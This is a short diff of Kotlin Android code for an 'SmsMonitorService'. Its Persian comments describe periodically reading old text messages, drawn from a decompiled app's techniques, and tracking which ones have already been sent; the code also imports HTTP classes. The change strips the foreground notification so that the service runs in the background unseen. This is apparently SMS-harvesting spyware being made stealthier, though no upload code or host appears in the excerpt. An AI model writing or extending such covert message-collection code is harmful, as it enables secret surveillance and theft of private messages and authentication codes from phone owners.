@@ -10,8 +10,6 @@ import android.os.IBinder
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
-import androidx.core.app.NotificationCompat
-import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
@@ -23,15 +21,12 @@ import java.util.concurrent.TimeUnit
  * 🔥 سرویس مانیتورینگ SMS - از تکنیک‌های برنامه decompiled
  * - هر 30 دقیقه پیامک‌های قدیمی رو چک میکنه
  * - با ScheduledExecutorService کار میکنه
- * - Foreground service برای جلوگیری از kill شدن
+ * - Background service (بدون notification)
  */
 class SmsMonitorService : Service() {
 
     companion object {
         private const val TAG = "SmsMonitorService"
-        // 🔥 استفاده از همون notification UnifiedService
-        private const val NOTIFICATION_ID = 1001  // همون ID UnifiedService
-        private const val CHANNEL_ID = "unified_service_channel"  // همون channel UnifiedService
         
         // 🔥 ذخیره ID های پیامک‌هایی که قبلاً فرستاده شدن
         private val processedSmsIds = HashSet<String>()
